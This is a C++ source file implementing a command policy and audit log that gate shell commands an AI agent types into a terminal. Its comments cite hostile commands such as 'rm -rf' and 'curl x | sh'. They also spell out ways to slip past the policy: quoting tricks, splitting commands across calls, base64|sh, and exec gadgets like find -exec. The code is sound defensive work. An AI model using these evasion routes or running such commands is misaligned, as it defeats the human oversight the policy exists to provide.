// Copyright (C) 2026 Stanislav Yaglo
// SPDX-License-Identifier: Apache-2.0

//
// Source/Core/Security/AgentPolicy.cpp — see AgentPolicy.h.
//

#include "Core/Security/AgentPolicy.h"

#include "Core/Session/ControlPaths.h"
#include "PAL/DurableFile.h"
#include "PAL/Log.h"

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <span>
#include <string>
#include <vector>

namespace Ubiquitty::Security {

const char* policyDecisionName(PolicyDecision decision)
{
    switch (decision) {
    case PolicyDecision::Allow:
        return "allow";
    case PolicyDecision::Confirm:
        return "confirm";
    case PolicyDecision::Deny:
        return "deny";
    }
    return "?";
}

namespace {

std::string trimmed(const char* s)
{
    while (*s == ' ' || *s == '\t' || *s == '\r' || *s == '\n')
        ++s;
    std::size_t length = std::strlen(s);
    while (length > 0 && (s[length - 1] == ' ' || s[length - 1] == '\t' || s[length - 1] == '\r' || s[length - 1] == '\n'))
        --length;
    return std::string(s, length);
}

// The line without its comment. As in the shell, `#` opens a comment where a
// word would begin — at the start of the line or after a blank — and outside
// quotes, so `deny rm -rf   # never run` names `rm -rf` while `allow a#b` and
// `deny '#tag'` keep their `#`.
std::string withoutComment(const std::string& line)
{
    char quote = '\0';
    for (std::size_t index = 0; index < line.size(); ++index) {
        const char c = line[index];
        if (quote) {
            if (c == quote)
                quote = '\0';
            else if (c == '\\' && quote == '"' && index + 1 < line.size())
                ++index;
        } else if (c == '\\' && index + 1 < line.size()) {
            ++index;
        } else if (c == '\'' || c == '"') {
            quote = c;
        } else if (c == '#' && (index == 0 || line[index - 1] == ' ' || line[index - 1] == '\t')) {
            return trimmed(line.substr(0, index).c_str());
        }
    }
    return line;
}

bool parseDecision(const std::string& word, PolicyDecision& out)
{
    if (word == "allow") {
        out = PolicyDecision::Allow;
        return true;
    }
    if (word == "confirm") {
        out = PolicyDecision::Confirm;
        return true;
    }
    if (word == "deny") {
        out = PolicyDecision::Deny;
        return true;
    }
    return false;
}

// A byte that ends a token. Space and tab are the shell's own separators; a
// control byte is a token gap too, because the line discipline or the shell
// acts on it before any argv exists — a carriage return submits what precedes
// it, ^U discards it, ESC opens a sequence — so `hi\rrm` is two words to the
// PTY and must be two tokens to the matcher, or a deny rule on the second word
// never sees it.
bool isTokenGap(char c)
{
    const unsigned char byte = static_cast<unsigned char>(c);
    return c == ' ' || c == '\t' || byte < 0x20 || byte == 0x7f;
}

// Tokenize a shell-like command line into normalized argv tokens.
//
// Rules (shell approximation, not full POSIX):
//   - Tokens are separated by unquoted whitespace (space, tab).
//   - Single-quoted spans: content taken literally; no escape sequences inside.
//   - Double-quoted spans: content taken with backslash-escape processing
//     (\\ → \, \" → "); other backslash pairs kept verbatim.
//   - Outside quotes: backslash escapes the next character (\\→\, \<any>→<any>).
//   - Adjacent quoted/unquoted pieces without whitespace between them merge
//     into one token (e.g. r''m → rm, "fo"'o' → foo).
//   - Unmatched quotes consume to end-of-input (lenient: no error).
//
// This normalisation means `r''m -rf` and `r\m   -rf` both tokenize to
// ["rm", "-rf"], closing the quoting and extra-whitespace evasion holes
// a raw-substring matcher leaves.
std::vector<std::string> tokenize(const std::string& line)
{
    std::vector<std::string> tokens;
    std::size_t i = 0;
    const std::size_t n = line.size();
    while (i < n) {
        // skip inter-token whitespace
        while (i < n && isTokenGap(line[i]))
            ++i;
        if (i >= n)
            break;

        std::string token;
        bool isInsideToken = false;
        while (i < n && (isInsideToken || !isTokenGap(line[i]))) {
            isInsideToken = true;
            char c = line[i];
            if (c == '\'') {
                // single-quoted: literal until closing '
                ++i;
                while (i < n && line[i] != '\'')
                    token += line[i++];
                if (i < n)
                    ++i; // consume closing '
            } else if (c == '"') {
                // double-quoted: backslash escapes \\ and \" only
                ++i;
                while (i < n && line[i] != '"') {
                    if (line[i] == '\\' && i + 1 < n && (line[i + 1] == '\\' || line[i + 1] == '"')) {
                        token += line[i + 1];
                        i += 2;
                    } else
                        token += line[i++];
                }
                if (i < n)
                    ++i; // consume closing "
            } else if (c == '\\' && i + 1 < n) {
                // unquoted backslash: next char literal
                token += line[i + 1];
                i += 2;
            } else {
                // unquoted, non-whitespace
                if (isTokenGap(c))
                    break; // inter-token gap
                token += c;
                ++i;
            }
        }
        if (!token.empty())
            tokens.push_back(std::move(token));
    }
    return tokens;
}

// True iff pattern's token sequence appears as a contiguous subsequence
// starting at offset `start` in commandTokens.
bool tokenSequenceMatchesAt(const std::vector<std::string>& commandTokens, const std::vector<std::string>& patternTokens, std::size_t start)
{
    if (start + patternTokens.size() > commandTokens.size())
        return false;
    for (std::size_t i = 0; i < patternTokens.size(); ++i) {
        if (commandTokens[start + i] != patternTokens[i])
            return false;
    }
    return true;
}

// True iff patternTokens appears as a contiguous subsequence anywhere in
// commandTokens.
bool containsTokenSubsequence(const std::vector<std::string>& commandTokens, const std::vector<std::string>& patternTokens)
{
    if (patternTokens.empty())
        return false;
    if (commandTokens.size() < patternTokens.size())
        return false;
    const std::size_t limit = commandTokens.size() - patternTokens.size();
    for (std::size_t i = 0; i <= limit; ++i) {
        if (tokenSequenceMatchesAt(commandTokens, patternTokens, i))
            return true;
    }
    return false;
}

// Shell metacharacters that execute or interpolate something a static token
// match never inspected: command substitution, chaining, pipes, redirection,
// expansion, subshells. Presence downgrades an Allow to Confirm — an allow rule
// matches a token subsequence, so `git log; curl x | sh` matches `allow git`
// yet runs far more than git. A control byte other than tab is indirection for
// the same reason: the line discipline or the shell acts on it — a carriage
// return submits the line so far, ^U discards it, ESC opens a sequence the
// matcher cannot read — so the text runs more than the tokens it matched.
bool hasShellIndirection(const std::string& line)
{
    for (char c : line) {
        const unsigned char byte = static_cast<unsigned char>(c);
        if ((byte < 0x20 && c != '\t') || byte == 0x7f)
            return true;
        switch (c) {
        case '|':
        case '&':
        case ';':
        case '<':
        case '>':
        case '`':
        case '$':
        case '(':
        case ')':
            return true;
        default:
            break;
        }
    }
    return false;
}

// Env override, else <control-directory>/<leaf> (control-directory honors
// $UBIQUITTY_HOME). Empty when neither resolves.
std::string resolvePath(const char* envVar, const char* leaf)
{
    const char* over = ::getenv(envVar);
    if (over && over[0])
        return std::string(over);
    char path[1024];
    if (!Ubiquitty::Session::controlFilePath(leaf, path))
        return std::string();
    return std::string(path);
}

} // namespace

bool AgentPolicy::loadFromFile(const char* path)
{
    if (!path || !path[0])
        return false;
    std::FILE* file = std::fopen(path, "r");
    if (!file)
        return false;
    char line[4096];
    while (std::fgets(line, sizeof(line), file)) {
        std::string s = withoutComment(trimmed(line));
        if (s.empty())
            continue;
        std::size_t space = s.find_first_of(" \t");
        std::string head = (space == std::string::npos) ? s : s.substr(0, space);
        std::string rest = (space == std::string::npos) ? std::string() : trimmed(s.c_str() + space);
        if (head == "default") {
            PolicyDecision decision;
            if (parseDecision(rest, decision))
                m_default = decision;
            continue;
        }
        PolicyDecision action;
        if (parseDecision(head, action) && !rest.empty())
            m_rules.push_back(Rule { action, rest, tokenize(rest) });
    }
    std::fclose(file);
    return true;
}

void AgentPolicy::loadDefault()
{
    std::string path = resolvePath("UBIQUITTY_AGENT_POLICY", "agent-policy.conf");
    if (!path.empty())
        loadFromFile(path.c_str());
}

PolicyDecision AgentPolicy::evaluate(const std::string& commandLine, Subject subject) const
{
    // Tokenize + normalize the command line so that quoting tricks
    // (`r''m -rf`, `r\m -rf`) and extra whitespace (`rm   -rf`) all produce
    // the same token sequence as the plain form. A rule matches iff its
    // pattern tokens appear as a contiguous subsequence of the command tokens,
    // which also prevents over-matching: deny `rm` does not block `perform`.
    //
    // Residual limits — this is not a complete authorization boundary:
    //   - Fragmentation across separate terminal_send calls (send `r`, then
    //     `m -rf`) is invisible to a single-call evaluator.
    //   - Full shell power (eval, base64|sh, alias) defeats any static matcher.
    //   - An allowed binary that is itself an exec gadget (git -c alias,
    //     find -exec, awk system(), env, xargs) runs a subcommand with no
    //     metacharacters, so hasShellIndirection can't catch it — only
    //     allow-list curation can.
    //   - deny-list is a CONVENIENCE FILTER, not a hard authorization boundary.
    //   - The safe default posture is default-Confirm (fail-safe) or an
    //     explicit allow-list — rely on those, not on deny patterns alone.
    const std::vector<std::string> commandTokens = tokenize(commandLine);
    PolicyDecision decision = m_default;
    for (const auto& rule : m_rules) {
        if (rule.pattern.empty())
            continue;
        if (containsTokenSubsequence(commandTokens, rule.patternTokens)) {
            decision = rule.action;
            break;
        }
    }
    // An Allow vets only the matched tokens; shell indirection can run more
    // than that, so it never runs unattended — Deny/Confirm already hold.
    if (decision == PolicyDecision::Allow && subject == Subject::AgentSupplied && hasShellIndirection(commandLine))
        return PolicyDecision::Confirm;
    return decision;
}

namespace {

void appendAuditRecord(uint32_t sessionID, const char* kind, const std::string& detail, const char* outcome)
{
    static bool warned = false;
    std::string path = resolvePath("UBIQUITTY_AGENT_AUDIT", "agent-audit.log");
    if (path.empty())
        return;
    // One record per line: flatten any control chars in the detail.
    std::string flat = detail;
    for (char& c : flat) {
        if (static_cast<unsigned char>(c) < 0x20)
            c = ' ';
    }
    char stamp[32] = "0000-00-00T00:00:00Z";
    std::time_t now = std::time(nullptr);
    std::tm tmUTC;
    if (::gmtime_r(&now, &tmUTC))
        std::strftime(stamp, sizeof(stamp), "%Y-%m-%dT%H:%M:%SZ", &tmUTC);
    // The log records what agents typed, so it is owner-only whatever the
    // umask of the process that first writes it.
    const std::string record = std::string(stamp) + " session=" + std::to_string(sessionID) + " " + kind + " " + outcome + ": " + flat + "\n";
    if (!Ubiquitty::PAL::storageAppendOwnerOnly(path.c_str(), std::as_bytes(std::span(record))) && !warned) {
        Ubiquitty::PAL::logLine(stderr, "ubiquitty: cannot write audit log {} (continuing)", path);
        warned = true;
    }
}

} // namespace

void auditRecord(uint32_t sessionID, const char* kind, const std::string& detail, PolicyDecision decision)
{
    appendAuditRecord(sessionID, kind, detail, policyDecisionName(decision));
}

void auditIncompleteAction(uint32_t sessionID, const char* kind, const std::string& detail)
{
    appendAuditRecord(sessionID, kind, detail, "incomplete");
}

} // namespace Ubiquitty::Security
